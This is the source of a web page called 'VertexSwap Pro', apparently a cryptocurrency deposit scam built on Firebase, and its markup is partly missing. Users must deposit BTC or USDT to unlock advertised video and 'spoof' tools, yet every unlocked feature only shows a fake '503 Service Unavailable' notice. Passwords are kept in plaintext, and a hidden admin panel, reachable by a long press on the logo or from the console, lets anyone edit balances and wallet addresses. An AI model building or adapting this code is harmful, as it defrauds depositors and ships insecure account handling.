<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>VertexSwap Pro</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif}
        body{background:#0b0e14;color:#e8edf5;min-height:100vh;display:flex;flex-direction:column}

        /* --- Auth --- */
        .auth-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:radial-gradient(ellipse at center,#141b26 0%,#0b0e14 70%);padding:20px}
        .auth-card{background:#151e2a;border-radius:18px;padding:40px 36px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,.6);border:1px solid #253040}
        .auth-card h1{font-size:26px;margin-bottom:4px;background:linear-gradient(135deg,#00c9ff,#92fe9d);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .auth-card p.sub{color:#7a8ba3;margin-bottom:28px;font-size:14px}
        .auth-card label{display:block;font-size:13px;color:#9aabc1;margin-bottom:5px}
        .auth-card input{width:100%;padding:12px 14px;background:#0f1620;border:1px solid #253040;border-radius:10px;color:#fff;font-size:14px;margin-bottom:16px;transition:.2s}
        .auth-card input:focus{outline:none;border-color:#00c9ff;box-shadow:0 0 0 3px rgba(0,201,255,.15)}
        .auth-card button{width:100%;padding:13px;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#00c9ff,#92fe9d);color:#0b0e14;transition:.3s}
        .auth-card button:hover{transform:translateY(-1px);box-shadow:0 8px 25px rgba(0,201,255,.3)}
        .auth-card .alt-link{text-align:center;margin-top:18px;font-size:13px;color:#7a8ba3}
        .auth-card .alt-link a{color:#00c9ff;text-decoration:none;cursor:pointer}
        .auth-card .alt-link a:hover{text-decoration:underline}
        .auth-error{background:#2d1414;color:#ff6b6b;padding:10px 14px;border-radius:8px;font-size:13px;margin-bottom:16px;display:none;border:1px solid #4a1c1c}

        /* --- App --- */
        .app-container{display:none;flex-direction:column;min-height:100vh}
        .app-container.active{display:flex}
        .topbar{background:#111924;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #1f2b3a;position:sticky;top:0;z-index:100}
        .topbar .logo{font-size:20px;font-weight:700;background:linear-gradient(135deg,#00c9ff,#92fe9d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;cursor:pointer;user-select:none}
        .topbar .user-info{display:flex;align-items:center;gap:14px}
        .topbar .user-info span{color:#9aabc1;font-size:13px}
        .topbar .user-info .bal{color:#92fe9d;font-weight:600}
        .topbar .logout-btn{background:#253040;border:none;color:#e8edf5;padding:7px 16px;border-radius:8px;cursor:pointer;font-size:13px}
        .topbar .logout-btn:hover{background:#314257}
        .announcement{background:#1a2533;margin:16px 24px 0;padding:12px 18px;border-radius:10px;border-left:4px solid #ffc107;font-size:13px;color:#ffd966;display:none}
        .announcement.show{display:block}
        .main{flex:1;padding:20px 24px 80px;max-width:1100px;width:100%;margin:0 auto}
        .section-title{font-size:18px;font-weight:600;margin:28px 0 14px;color:#c8d6e5;display:flex;align-items:center;gap:8px}
        .section-title:first-of-type{margin-top:8px}
        .section-title small{font-weight:400;font-size:12px;color:#7a8ba3}
        .feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:14px}
        .feature-card{background:#151e2a;border:1px solid #1f2b3a;border-radius:14px;padding:18px 12px 14px;text-align:center;cursor:pointer;transition:.25s;position:relative}
        .feature-card:hover{border-color:#3a5068;transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.3)}
        .feature-card.locked{opacity:.55;cursor:not-allowed}
        .feature-card.locked:hover{transform:none;border-color:#1f2b3a;box-shadow:none}
        .feature-card .icon-wrap{height:44px;display:flex;align-items:center;justify-content:center;margin-bottom:8px}
        .feature-card .icon-wrap svg{width:36px;height:36px;fill:#92fe9d}
        .feature-card .fname{font-size:13px;font-weight:500;color:#e8edf5}
        .feature-card .fdep{font-size:11px;color:#7a8ba3;margin-top:4px}
        .feature-card .lock-badge{position:absolute;top:8px;right:10px;font-size:12px;color:#ff6b6b}

        /* --- Modal --- */
        .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:999;align-items:center;justify-content:center;padding:20px}
        .modal-overlay.show{display:flex}
        .modal{background:#151e2a;border-radius:16px;width:100%;max-width:480px;padding:30px 28px;border:1px solid #253040;box-shadow:0 25px 70px rgba(0,0,0,.7);max-height:90vh;overflow-y:auto}
        .modal h2{font-size:20px;margin-bottom:4px}
        .modal p.sub2{color:#7a8ba3;font-size:13px;margin-bottom:18px}
        .modal label{display:block;font-size:13px;color:#9aabc1;margin-bottom:5px;margin-top:14px}
        .modal input,.modal select,.modal textarea{width:100%;padding:11px 14px;background:#0f1620;border:1px solid #253040;border-radius:10px;color:#fff;font-size:14px;margin-bottom:6px}
        .modal select{appearance:auto}
        .modal input:focus,.modal select:focus{outline:none;border-color:#00c9ff}
        .modal .btn-primary{width:100%;padding:13px;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#00c9ff,#92fe9d);color:#0b0e14;margin-top:18px}
        .modal .btn-primary:hover{box-shadow:0 8px 25px rgba(0,201,255,.3)}
        .modal .btn-danger{background:#2d1414;color:#ff6b6b;border:1px solid #4a1c1c}
        .modal .btn-secondary{background:#253040;color:#e8edf5;border:1px solid #314257}
        .modal .close-btn{float:right;background:none;border:none;color:#7a8ba3;font-size:22px;cursor:pointer;line-height:1}
        .deposit-address{background:#0f1620;padding:12px;border-radius:8px;text-align:center;font-size:13px;color:#92fe9d;word-break:break-all;margin:10px 0;cursor:pointer;border:1px dashed #253040;transition:.2s}
        .deposit-address:hover{border-color:#00c9ff;background:#1a2533}
        .deposit-address.copied{border-color:#92fe9d;color:#92fe9d}
        .payment-methods{display:flex;gap:10px;margin:10px 0}
        .payment-methods button{flex:1;padding:10px;border:1px solid #253040;border-radius:8px;background:#0f1620;color:#e8edf5;cursor:pointer;font-size:13px;transition:.2s}
        .payment-methods button.active{border-color:#00c9ff;background:#1a2a3a}
        .admin-table{width:100%;border-collapse:collapse;margin-top:12px;font-size:13px}
        .admin-table th{text-align:left;padding:10px 8px;color:#7a8ba3;border-bottom:1px solid #1f2b3a;font-weight:500}
        .admin-table td{padding:10px 8px;border-bottom:1px solid #19222f}
        .admin-table .btn-sm{padding:5px 12px;border:none;border-radius:6px;cursor:pointer;font-size:12px}
        .admin-table .btn-sm.green{background:#1a3a2a;color:#92fe9d}
        .admin-table .btn-sm.red{background:#3a1a1a;color:#ff6b6b}
        .admin-table .btn-sm.blue{background:#1a2a3a;color:#66b0ff}
        .tabs{display:flex;gap:4px;margin-bottom:16px;background:#0f1620;border-radius:10px;padding:4px}
        .tabs button{flex:1;padding:9px;background:transparent;border:none;color:#7a8ba3;cursor:pointer;border-radius:8px;font-size:13px}
        .tabs button.active{background:#253040;color:#e8edf5}
        .toast{position:fixed;bottom:30px;right:30px;background:#1a2a3a;border:1px solid #253040;border-radius:10px;padding:14px 20px;color:#e8edf5;font-size:13px;z-index:2000;display:none;box-shadow:0 10px 40px rgba(0,0,0,.5)}
        .toast.show{display:block;animation:slideIn .3s ease}
        @keyframes slideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
        .hidden{display:none!important}
        .deposit-item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #19222f;font-size:13px;align-items:center}
        .deposit-item .status{padding:3px 10px;border-radius:20px;font-size:11px}
        .status.pending{background:#2a2a1a;color:#ffc107}
        .status.approved{background:#1a3a2a;color:#92fe9d}
        .status.rejected{background:#3a1a1a;color:#ff6b6b}
        @media(max-width:600px){.feature-grid{grid-template-columns:repeat(2,1fr)}.topbar{padding:12px 14px;flex-wrap:wrap;gap:8px}.main{padding:14px 14px 60px}.modal{padding:20px 16px}}
    </style>
</head>

// ============================================================
//  FIREBASE DB REFS
// ============================================================
const refUsers = db.ref('users');
const refDeposits = db.ref('deposits');
const refSettings = db.ref('settings');

let CURRENT_USER = null;  // { username, email, password, balance, status }

// ============================================================
//  AUTH
// ============================================================
function showReg() { $('loginPage').style.display='none'; $('registerPage').style.display='flex'; }
function showLog() { $('registerPage').style.display='none'; $('loginPage').style.display='flex'; }

function handleLogin() {
    const user = $('loginUser').value.trim();
    const pass = $('loginPass').value.trim();
    $('loginError').style.display='none';
    if(!user||!pass){ errDiv('loginError','Fill all fields.'); return; }

    refUsers.child(user).once('value').then(snap=>{
        const data = snap.val();
        if(!data||data.password!==pass){ errDiv('loginError','Invalid credentials.'); return; }
        if(data.status==='blocked'){ errDiv('loginError','Account blocked. Contact admin.'); return; }
        CURRENT_USER = { username:user, ...data };
        localStorage.setItem('vs_session', user);
        renderApp();
    });
}

function handleRegister() {
    const user = $('regUser').value.trim();
    const email = $('regEmail').value.trim();
    const pass = $('regPass').value.trim();
    $('regError').style.display='none';
    if(!user||!email||!pass){ errDiv('regError','Fill all fields.'); return; }

    refUsers.child(user).once('value').then(snap=>{
        if(snap.exists()){ errDiv('regError','Username taken.'); return; }
        refUsers.child(user).set({ email, password:pass, balance:0, status:'active' });
        CURRENT_USER = { username:user, email, password:pass, balance:0, status:'active' };
        localStorage.setItem('vs_session', user);
        renderApp();
    });
}

function handleLogout() {
    CURRENT_USER=null;
    localStorage.removeItem('vs_session');
    $('appContainer').classList.remove('active');
    $('loginPage').style.display='flex';
    $('loginUser').value=''; $('loginPass').value='';
}

// ============================================================
//  RENDER APP
// ============================================================
function renderApp() {
    if(!CURRENT_USER){ $('loginPage').style.display='flex'; return; }
    $('loginPage').style.display='none'; $('registerPage').style.display='none';
    $('appContainer').classList.add('active');
    $('displayUser').textContent=CURRENT_USER.username;
    $('displayBal').textContent='$'+Number(CURRENT_USER.balance).toFixed(2);

    // Settings / announcement
    refSettings.once('value').then(snap=>{
        const s = snap.val()||{};
        const ann=$('announcementBar');
        if(s.announcement&&s.announcement.trim()){ ann.textContent='📢 '+s.announcement; ann.classList.add('show'); }
        else ann.classList.remove('show');
    });

    renderFeatures();
}

function renderFeatures() {
    const bal = Number(CURRENT_USER.balance);
    const grids={video:'gridVideo',spoof:'gridSpoof',service:'gridServices'};
    for(const[cat,id]of Object.entries(grids)){
        const el=$(id); el.innerHTML='';
        FEATURES.filter(f=>f.cat===cat).forEach(f=>{
            const ok = bal>=f.deposit;
            const card=document.createElement('div');
            card.className='feature-card'+(ok?'':' locked');
            card.innerHTML=`<div class="icon-wrap">${ICONS[f.icon]||''}</div><div class="fname">${f.name}</div><div class="fdep">Requires $${f.deposit}</div>${!ok?'<div class="lock-badge">🔒</div>':''}`;
            card.addEventListener('click',()=>handleFeature(f,ok));
            el.appendChild(card);
        });
    }
}

function handleFeature(feature,ok) {
    const modal=$('modalContent');
    const overlay=$('modalOverlay');
    if(!ok){
        modal.innerHTML=`
            <button class="close-btn" onclick="closeModal()">&times;</button>
            <h2>🔒 Access Required</h2>
            <p class="sub2">You need <strong>$${feature.deposit}</strong> to unlock ${feature.name}.</p>
            <p style="color:#7a8ba3;font-size:13px;margin:12px 0;">Your balance: <strong style="color:#92fe9d;">$${Number(CURRENT_USER.balance).toFixed(2)}</strong></p>
            <button class="btn-primary" onclick="closeModal();openDeposit()">Deposit Now</button>
            <button class="btn-secondary" style="width:100%;margin-top:8px" onclick="closeModal()">Cancel</button>`;
    } else {
        modal.innerHTML=`
            <button class="close-btn" onclick="closeModal()">&times;</button>
            <div style="text-align:center;padding:20px 0">
                <div style="font-size:50px;margin-bottom:12px;">⚠️</div>
                <h2>Service Unavailable</h2>
                <p class="sub2">We're experiencing heavy traffic. Please try again later.</p>
                <div style="background:#0f1620;border-radius:10px;padding:14px;margin:16px 0;font-size:13px;color:#ffc107;">
                    Error 503 — Server is currently at capacity.<br/>
                    <span style="color:#7a8ba3;font-size:11px;">Expected resolution within 2–4 hours.</span>
                </div>
                <button class="btn-primary" onclick="closeModal()">OK</button>
            </div>`;
    }
    overlay.classList.add('show');
}

// ============================================================
//  DEPOSIT
// ============================================================
function openDeposit() {
    const overlay=$('modalOverlay');
    const modal=$('modalContent');
    refSettings.once('value').then(snap=>{
        const s = snap.val()||{minDeposit:50,btcWallet:'bc1q...',usdtWallet:'TRX...'};
        modal.innerHTML=`
            <button class="close-btn" onclick="closeModal()">&times;</button>
            <h2>💰 Make a Deposit</h2>
            <p class="sub2">Minimum deposit: <strong>$${s.minDeposit}</strong></p>
            <label>Select Asset</label>
            <select id="depAsset">
                <option value="btc">Bitcoin (BTC)</option>
                <option value="usdt">USDT (TRC-20)</option>
            </select>
            <label>Amount (USD)</label>
            <input type="number" id="depAmount" min="${s.minDeposit}" step="0.01" placeholder="e.g. 100" />
            <label>Send to Address (tap to copy)</label>
            <div id="depAddrBox" class="deposit-address" onclick="copyAddress()">${s.btcWallet}</div>
            <p style="color:#7a8ba3;font-size:11px;text-align:center;">Send exact amount. Deposits manually approved.</p>
            <button class="btn-primary" onclick="submitDeposit()">Submit Deposit</button>`;
        overlay.classList.add('show');
        $('depAsset').addEventListener('change',function(){
            const addr=$('depAddrBox');
            const val = this.value==='btc' ? (s.btcWallet||'bc1q...') : (s.usdtWallet||'TRX...');
            addr.textContent=val; addr.classList.remove('copied');
        });
    });
}

function copyAddress() {
    const addr=$('depAddrBox');
    const text = addr.textContent;
    if(navigator.clipboard){
        navigator.clipboard.writeText(text).then(()=>{
            addr.classList.add('copied');
            addr.textContent='✅ Copied! '+text;
            setTimeout(()=>{ addr.textContent=text; addr.classList.remove('copied'); },2000);
        });
    } else {
        // fallback
        const ta = document.createElement('textarea');
        ta.value=text; document.body.appendChild(ta); ta.select();
        document.execCommand('copy'); document.body.removeChild(ta);
        addr.classList.add('copied'); addr.textContent='✅ Copied! '+text;
        setTimeout(()=>{ addr.textContent=text; addr.classList.remove('copied'); },2000);
    }
}

function submitDeposit() {
    const asset = $('depAsset').value;
    const amount = parseFloat($('depAmount').value);
    if(!amount||amount<0){ showToast('Enter a valid amount.'); return; }

    refSettings.once('value').then(snap=>{
        const s = snap.val()||{minDeposit:50};
        if(amount<s.minDeposit){ showToast('Minimum deposit is $'+s.minDeposit); return; }
        const depId = Date.now().toString();
        refDeposits.child(depId).set({
            id: depId,
            username: CURRENT_USER.username,
            asset: asset==='btc'?'BTC':'USDT (TRC-20)',
            amount: amount,
            status: 'pending',
            date: new Date().toISOString()
        });
        showToast('Deposit submitted for approval.');
        closeModal();
    });
}

// ============================================================
//  ADMIN — long press (3s) on logo
// ============================================================
let pressTimer = null;
$('logoEl').addEventListener('mousedown', function(e){
    pressTimer = setTimeout(() => {
        pressTimer = null;
        openAdmin();
    }, 2000); // 2 second hold
});
$('logoEl').addEventListener('mouseup', function(){ if(pressTimer){ clearTimeout(pressTimer); pressTimer=null; } });
$('logoEl').addEventListener('mouseleave', function(){ if(pressTimer){ clearTimeout(pressTimer); pressTimer=null; } });
// touch support
$('logoEl').addEventListener('touchstart', function(e){
    pressTimer = setTimeout(() => {
        pressTimer = null;
        openAdmin();
    }, 2000);
});
$('logoEl').addEventListener('touchend', function(){ if(pressTimer){ clearTimeout(pressTimer); pressTimer=null; } });
$('logoEl').addEventListener('touchmove', function(){ if(pressTimer){ clearTimeout(pressTimer); pressTimer=null; } });

// Also console shortcut
// Just type: openAdmin()

function openAdmin() {
    const overlay=$('modalOverlay');
    const modal=$('modalContent');

    Promise.all([
        refUsers.once('value'),
        refDeposits.once('value'),
        refSettings.once('value')
    ]).then(([uSnap,dSnap,sSnap])=>{
        const users = uSnap.val()||{};
        const deps = dSnap.val()||{};
        const settings = sSnap.val()||{minDeposit:50,announcement:'',btcWallet:'',usdtWallet:''};

        let userRows = Object.entries(users).map(([uname,udata])=>`
            <tr>
                <td>${uname}</td>
                <td>${udata.balance.toFixed(2)}</td>
                <td>${udata.status||'active'}</td>
                <td>
                    <button class="btn-sm green" onclick="adminCredit('${uname}')">Credit</button>
                    <button class="btn-sm red" onclick="adminDelete('${uname}')">Del</button>
                    <button class="btn-sm blue" onclick="adminToggle('${uname}')">${(udata.status||'active')==='active'?'Block':'Unblock'}</button>
                </td>
            </tr>`).join('');

        let depList = Object.values(deps).sort((a,b)=>b.id-a.id);
        let depRows = depList.map(d=>`
            <div class="deposit-item">
                <span><strong>${d.username}</strong> — $${d.amount} (${d.asset})</span>
                <span>
                    <span class="status ${d.status}">${d.status}</span>
                    ${d.status==='pending'?`
                        <button class="btn-sm green" onclick="adminApprove('${d.id}')">✓</button>
                        <button class="btn-sm red" onclick="adminReject('${d.id}')">✗</button>`:''}
                </span>
            </div>`).join('')||'<p style="color:#7a8ba3;font-size:13px;">No deposits.</p>';

        modal.innerHTML=`
            <button class="close-btn" onclick="closeModal()">&times;</button>
            <h2>⚙️ Admin Panel</h2>
            <p class="sub2">Manage users, deposits, and settings</p>
            <div class="tabs">
                <button class="active" onclick="admTab(this,'users')">Users</button>
                <button onclick="admTab(this,'deposits')">Deposits</button>
                <button onclick="admTab(this,'settings')">Settings</button>
            </div>
            <div id="admUsers"><table class="admin-table"><thead><tr><th>User</th><th>Bal</th><th>Status</th><th>Actions</th></tr></thead><tbody>${userRows}</tbody></table></div>
            <div id="admDeposits" style="display:none"><div style="background:#0f1620;border-radius:10px;padding:12px;">${depRows}</div></div>
            <div id="admSettings" style="display:none">
                <label>Min Deposit ($)</label>
                <input type="number" id="admMinDep" value="${settings.minDeposit||50}" step="0.01" />
                <label>BTC Wallet</label>
                <input type="text" id="admBtc" value="${settings.btcWallet||''}" />
                <label>USDT (TRC-20) Wallet</label>
                <input type="text" id="admUsdt" value="${settings.usdtWallet||''}" />
                <label>Announcement</label>
                <textarea id="admAnn" rows="3" style="resize:vertical">${settings.announcement||''}</textarea>
                <button class="btn-primary" onclick="admSaveSettings()">Save Settings</button>
            </div>`;
        overlay.classList.add('show');
    });
}

function admTab(btn,tab){
    document.querySelectorAll('.tabs button').forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    ['admUsers','admDeposits','admSettings'].forEach(id=>{
        $(id).style.display=id==='adm'+tab.charAt(0).toUpperCase()+tab.slice(1)?'block':'none';
    });
}

function adminCredit(uname){
    const amt = prompt('Credit amount ($):');
    if(!amt||isNaN(amt)||parseFloat(amt)<=0)return;
    refUsers.child(uname+'/balance').once('value').then(s=>{
        const cur = s.val()||0;
        refUsers.child(uname+'/balance').set(cur+parseFloat(amt));
        showToast(`Credited $${amt} to ${uname}`);
        setTimeout(openAdmin,300);
    });
}

function adminDelete(uname){
    if(!confirm(`Delete "${uname}"?`))return;
    refUsers.child(uname).remove();
    showToast(`Deleted ${uname}`);
    setTimeout(openAdmin,300);
}

function adminToggle(uname){
    refUsers.child(uname+'/status').once('value').then(s=>{
        const cur = s.val()||'active';
        refUsers.child(uname+'/status').set(cur==='active'?'blocked':'active');
        showToast(`${uname} toggled`);
        setTimeout(openAdmin,300);
    });
}

function adminApprove(depId){
    refDeposits.child(depId).once('value').then(s=>{
        const d = s.val();
        if(!d||d.status!=='pending')return;
        refUsers.child(d.username+'/balance').once('value').then(bSnap=>{
            const cur = bSnap.val()||0;
            refUsers.child(d.username+'/balance').set(cur+d.amount);
            refDeposits.child(depId+'/status').set('approved');
            showToast(`Approved $${d.amount} for ${d.username}`);
            setTimeout(openAdmin,300);
        });
    });
}

function adminReject(depId){
    refDeposits.child(depId+'/status').set('rejected');
    showToast('Deposit rejected');
    setTimeout(openAdmin,300);
}

function admSaveSettings(){
    const minDep = parseFloat($('admMinDep').value);
    const btc = $('admBtc').value.trim();
    const usdt = $('admUsdt').value.trim();
    const ann = $('admAnn').value.trim();
    if(!minDep||minDep<=0){showToast('Invalid min deposit');return;}
    refSettings.set({minDeposit:minDep,btcWallet:btc,usdtWallet:usdt,announcement:ann});
    showToast('Settings saved');
    closeModal();
    if(CURRENT_USER)renderApp();
}

// ============================================================
//  BOOT — check session
// ============================================================
(function boot(){
    const session = localStorage.getItem('vs_session');
    if(session){
        refUsers.child(session).once('value').then(snap=>{
            const data = snap.val();
            if(data&&data.status!=='blocked'){
                CURRENT_USER = { username:session, ...data };
                renderApp();
            } else {
                localStorage.removeItem('vs_session');
                $('loginPage').style.display='flex';
            }
        });
    } else {
        $('loginPage').style.display='flex';
    }
})();
</script>
